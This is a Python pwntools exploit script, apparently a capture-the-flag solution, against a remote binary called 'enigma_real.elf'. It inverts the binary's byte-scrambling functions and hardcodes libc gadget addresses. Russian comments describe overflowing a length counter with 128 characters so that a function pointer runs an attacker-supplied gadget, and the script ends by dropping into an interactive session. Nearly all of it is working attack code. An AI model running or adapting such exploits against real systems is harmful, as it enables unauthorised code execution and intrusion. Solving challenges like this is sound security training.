#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./enigma_real.elf --host 109.233.56.90 --port 11626
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./enigma_real.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11626)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def enigma1(c):
    for n in range(1000):
        if (37*(n ^ 0xd)) & 0xFF == c:
            return n

def enigma2(c):
    for n in range(1000):
        if (-n - 43) & 0xFF == c:
            return n

def enigma3(c):
    for n in range(1000):
        if (n ^ (2 * n)) & 0xFF == c:
            return n

def enigma4(c):
    return (c - 1) * 128
    for n in range(1000):
        if (n // 128 + 1) & 0xFF == c:
            return n


enigmas = [enigma2, enigma1, enigma4, enigma3, enigma3, enigma2, enigma1, enigma1, enigma4, enigma2, enigma4, enigma4, enigma1, enigma3, enigma2, enigma2]


io = start()





gadget1 = 0x7ffff7e05000 + 0xcbdda # r12, r13
g1_bytes = b'\xda\r\xed\xf7\xff\x7f\x00\x00'

gadget2 = 0x7ffff7e05000 + 0xcbddd # r12, rdx
g2_bytes = b'\xdd\r\xed\xf7\xff\x7f\x00\x00'

gadget3 = 0x7ffff7e05000 + 0xcbde0 # rsi, rdx
g3_bytes = b'\xe0\r\xed\xf7\xff\x7f\x00\x00'





# идея
# зафигачить 128 символов и тогда перетрется младший байт переменной curLen, т.е. мы можем выполнять цикл бесконечно
# тогда засылаем 15 любых чисел
# когда просят ввести 16-ое, вводим 128 символов (цифр)
# теперь curFooPtr -> на important_str
# а curDestination -> на s
# поэтому выполнится то, что записано у нас в important_str
# а там должен быть гаджет



# засылаем 'зашифрованный' гаджет, чтобы сервак его 'расшифровал' и исполнил
# 8 bytes
for i, c in enumerate(g3_bytes):
    io.recvuntil(b': ')
    io.sendline(str(enigmas[i](c)).encode()) 

# переполним счетчик и начнем цикл сначала 
io.recvuntil(b': ')
io.sendline(b'0'*128)

# тогда, чтобы дотянуться указателем curFoo до important_str (в которой у нас лежит гаджет)
# должны заслать еще 7 байт которые нам не важны и 1 байт обязательно нулевой (чтобы atoi сделала rsi == 0)
for i in range(8):
    io.recvuntil(b': ')
    io.sendline(b'0')


io.interactive()